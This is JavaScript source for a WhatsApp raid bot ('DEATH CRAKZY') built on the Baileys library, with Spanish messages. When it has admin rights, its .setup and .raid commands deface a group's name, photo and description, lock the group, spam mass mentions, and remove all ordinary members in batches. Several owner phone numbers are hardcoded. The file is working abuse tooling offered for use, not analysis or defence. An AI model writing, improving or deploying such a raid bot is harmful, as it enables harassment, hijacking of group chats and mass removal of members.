const Jimp = require('jimp')
global.Jimp = Jimp

const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const pino = require('pino');
const qrcode = require('qrcode-terminal');

process.on('unhandledRejection', (reason) => console.log('Unhandled Rejection:', reason));
process.on('uncaughtException', (err) => console.log('Uncaught Exception:', err));

const NOMBRE_GRUPO = '𝐃𝐄𝐀𝐓𝐇 𝐂𝐑𝐀𝐊𝐙𝐘';
const DESCRIPCION_GRUPO = `𝐍𝐔𝐊𝐄𝐀𝐃𝐎 𝐏𝐎𝐑 𝐂𝐑𝐀𝐊𝐙𝐘 𝐃𝐈𝐎𝐒 𝐓𝐎𝐃𝐎 𝐏𝐎𝐃𝐄𝐑𝐎𝐒𝐎\nSalmos 37:8-9 (TLA)\n\n📢 𝐂𝐀𝐍𝐀𝐋 𝐃𝐄 𝐂𝐑𝐀𝐊𝐘:\nhttps://whatsapp.com/channel/0029VbCP81gADTOEOgWQxW07`;

const BOT_OWNER = '5219613301789';
const BOT_OWNER_LID = '189915467931651';
const BOT_OWNER_2 = '584124339924';
const BOT_OWNER_LID_2 = '230103309123623';
const BOT_OWNER_3 = '3197010548990';
const BOT_OWNER_LID_3 = '180994837590121';

let FOTO_BUFFER = null;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/* =========================
   OWNERS DINÁMICOS
========================= */
function getOwners() {
  try {
    const data = JSON.parse(fs.readFileSync('./config.json'));
    return (data.owner || []).map(o => o.replace(/[^0-9]/g, ''));
  } catch {
    return [];
  }
}

function saveOwners(owners) {
  const cleanOwners = [...new Set(owners.map(o => o.replace(/[^0-9]/g, '')))];
  fs.writeFileSync('./config.json', JSON.stringify({ owner: cleanOwners }, null, 2));
}

async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: state,
    logger: pino({ level: 'silent' }),
    browser: ['DEATH CRAKZY', 'Chrome', '120.0.0'],
  });

  try {
    FOTO_BUFFER = fs.readFileSync('./gojo.jpg');
  } catch {
    log('⚠️ No se encontró gojo.jpg');
  }

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr) qrcode.generate(qr, { small: true });

    if (connection === 'close') {
      const statusCode = (lastDisconnect?.error instanceof Boom)?.output?.statusCode;
      const shouldReconnect = statusCode!== DisconnectReason.loggedOut;
      if (shouldReconnect) setTimeout(startBot, 5000);
    } else if (connection === 'open') {
      log('BOT CONECTADO');
    }
  });

  sock.ev.on('messages.upsert', async ({ messages }) => {
    try {
      const msg = messages[0];
      if (!msg.message || msg.key.fromMe) return;

      const from = msg.key.remoteJid;
      if (!from.endsWith('@g.us')) return;

      let text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
      const rawSender = msg.key.participant || msg.key.remoteJid;
      const senderNum = rawSender.replace(/[^0-9]/g, '');

      const metadata = await sock.groupMetadata(from);
      const botJid = sock.user.id.replace(/:[0-9]+/, '');
      const isBotAdmins = metadata.participants.find(p => p.id.replace(/:[0-9]+/, '') === botJid)?.admin!== null;

      // alias
      if (text === '.follar') text = '.raid';
      if (text === '.follar2') text = '.raid2';

      /* =========================
         🔐 PERMISOS MOD - FIX LID
      ========================= */
      const hardOwners = [BOT_OWNER, BOT_OWNER_LID, BOT_OWNER_2, BOT_OWNER_LID_2, BOT_OWNER_3, BOT_OWNER_LID_3];
      const dynamicOwners = getOwners();
      const isMod = hardOwners.includes(senderNum) || dynamicOwners.includes(senderNum);

      if (text === '.menu') {
        if (!isMod) return;
        await sock.sendMessage(from, {
          text: `📋 MENÚ CRAKZY\n\n.lock - Cerrar grupo\n.unlock - Abrir grupo\n.setup - Nuke grupo\n.tag texto - Mencionar todos\n.raid - Spam + Kick\n.raid2 - Kick masivo\n.mylid - Ver tu ID\n.addowner - Agregar owner\n.delowner - Quitar owner\n.listowner - Lista owners`
        });
      }

      if (text === '.mylid' || text === '.id') {
        await sock.sendMessage(from, {
          text: `Tu ID:\n${rawSender}\nSolo número:\n${senderNum}`
        });
      }

      /* =========================
         👑 OWNER COMMANDS
      ========================= */

      else if (text.startsWith('.addowner')) {
        if (!isMod) return;

        let number = text.split(' ')[1];
        if (!number) return sock.sendMessage(from, { text: 'Uso:.addowner 521xxx' });

        number = number.replace(/[^0-9]/g, '');
        if (!number) return sock.sendMessage(from, { text: 'Número inválido' });

        let owners = getOwners();
        if (!owners.includes(number)) {
          owners.push(number);
          saveOwners(owners);
        }

        await sock.sendMessage(from, { text: `✔ Owner agregado: ${number}` });
      }

      else if (text.startsWith('.delowner')) {
        if (!isMod) return;

        let number = text.split(' ')[1];
        if (!number) return sock.sendMessage(from, { text: 'Uso:.delowner 521xxx' });

        number = number.replace(/[^0-9]/g, '');
        let owners = getOwners().filter(v => v!== number);
        saveOwners(owners);

        await sock.sendMessage(from, { text: `✔ Owner eliminado: ${number}` });
      }

      else if (text === '.listowner') {
        if (!isMod) return;
        const owners = getOwners();
        const list = owners.length? owners.map(v => '• ' + v).join('\n') : 'No hay owners';
        await sock.sendMessage(from, { text: `📋 Owners:\n${list}` });
      }

      /* =========================
         ⚔️ COMANDOS MOD
      ========================= */

      if (!isMod) return;

      if (text === '.lock') {
        if (!isBotAdmins) return sock.sendMessage(from, { text: '❌ Necesito ser admin' });
        await sock.groupSettingUpdate(from, 'announcement');
        await sock.sendMessage(from, { text: '🔒 Grupo cerrado' });
      }

      else if (text === '.unlock') {
        if (!isBotAdmins) return sock.sendMessage(from, { text: '❌ Necesito ser admin' });
        await sock.groupSettingUpdate(from, 'not_announcement');
        await sock.sendMessage(from, { text: '🔓 Grupo abierto' });
      }

      else if (text === '.setup') {
        if (!isBotAdmins) return sock.sendMessage(from, { text: '❌ Necesito ser admin' });
        
        try {
          if (FOTO_BUFFER) await sock.updateProfilePicture(from, FOTO_BUFFER);
          await sleep(1000);
          await sock.groupUpdateSubject(from, NOMBRE_GRUPO);
          await sleep(1000);
          await sock.groupUpdateDescription(from, DESCRIPCION_GRUPO);
          await sock.sendMessage(from, { text: '⚡ Setup completado' });
        } catch (e) {
          await sock.sendMessage(from, { text: '❌ Error: ' + e.message });
        }
      }

      else if (text.startsWith('.tag')) {
        const mensaje = text.slice(4).trim() || 'Mención masiva';
        const mentions = metadata.participants.map(p => p.id);
        await sock.sendMessage(from, {
          text: `📢 ${mensaje}`,
          mentions
        });
      }

      else if (text === '.raid' || text === '.raid2') {
        if (!isBotAdmins) return sock.sendMessage(from, { text: '❌ Necesito ser admin' });

        await sock.groupSettingUpdate(from, 'announcement');

        if (text === '.raid') {
          if (FOTO_BUFFER) await sock.updateProfilePicture(from, FOTO_BUFFER);
          await sleep(1000);
        }

        await sock.groupUpdateSubject(from, NOMBRE_GRUPO);
        await sleep(1000);
        await sock.groupUpdateDescription(from, DESCRIPCION_GRUPO);
        await sleep(1000);

        const allOwners = [...hardOwners,...dynamicOwners];
        const miembros = metadata.participants.filter(p => {
          const num = p.id.replace(/[^0-9]/g, '');
          return!p.admin && p.id.replace(/:[0-9]+/, '')!== botJid &&!allOwners.includes(num);
        });

        const mentions = metadata.participants.map(p => p.id);

        if (text === '.raid') {
          for (let i = 0; i < 10; i++) {
            await sock.sendMessage(from, { 
              text: `💀 CRAKZY DOMINA ${i+1}/10`, 
              mentions 
            });
            await sleep(800);
          }
        }

        const chunkSize = 5;
        for (let i = 0; i < miembros.length; i += chunkSize) {
          const chunk = miembros.slice(i, i + chunkSize).map(m => m.id);
          try {
            await sock.groupParticipantsUpdate(from, chunk, 'remove');
            await sleep(1500);
          } catch {}
        }

        await sock.sendMessage(from, { text: '☠️ Raid completado' });
      }

    } catch (e) {
      log('Error: ' + e.message);
    }
  });
}

startBot();
